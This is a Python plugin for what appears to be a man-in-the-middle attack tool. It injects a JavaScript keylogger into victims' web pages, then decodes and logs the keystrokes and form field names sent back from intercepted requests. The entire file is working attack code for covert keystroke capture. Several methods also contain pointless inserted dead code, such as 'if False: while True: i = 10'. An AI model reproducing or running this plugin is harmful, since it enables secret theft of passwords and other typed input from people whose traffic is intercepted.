from plugins.inject import Inject
from plugins.plugin import Plugin

class JSKeylogger(Inject, Plugin):
    name = 'JSKeylogger'
    optname = 'jskeylogger'
    desc = 'Injects a javascript keylogger into clients webpages'
    version = '0.2'

    def initialize(self, options):
        if False:
            while True:
                i = 10
        Inject.initialize(self, options)
        self.js_file = './core/javascript/msfkeylogger.js'

    def request(self, request):
        if False:
            return 10
        if 'keylog' in request.uri:
            request.handle_post_output = True
            raw_keys = request.postData.split('&&')[0]
            input_field = request.postData.split('&&')[1]
            keys = raw_keys.split(',')
            if keys:
                del keys[0]
                del keys[len(keys) - 1]
                nice = ''
                for n in keys:
                    if n == '9':
                        nice += '<TAB>'
                    elif n == '8':
                        nice = nice[:-1]
                    elif n == '13':
                        nice = ''
                    else:
                        try:
                            nice += unichr(int(n))
                        except:
                            self.clientlog.error('Error decoding char: {}'.format(n), extra=request.clientInfo)
                self.clientlog.info(u'Host: {} | Field: {} | Keys: {}'.format(request.headers['host'], input_field, nice), extra=request.clientInfo)

    def options(self, options):
        if False:
            while True:
                i = 10
        pass